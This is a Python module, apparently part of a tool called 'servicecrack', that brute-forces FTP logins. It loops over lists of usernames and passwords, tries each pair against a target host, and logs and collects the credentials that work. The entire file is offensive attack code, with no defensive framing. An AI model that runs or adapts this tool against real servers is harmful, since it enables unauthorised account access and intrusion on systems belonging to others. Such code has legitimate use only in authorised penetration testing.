# coding: utf-8
import ftplib
from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("ftp")

service_name = "ftp"


class FtpCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(FtpCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 21

    def run(self):
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            ftp.login(username, password)
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.info(e)
            logging.debug("brute faild:{} {}".format(username, password))
            ftp.quit()
        finally:
            if not success:
                return
            ftp.quit()
            self.result.append({"username": username, "password": password})


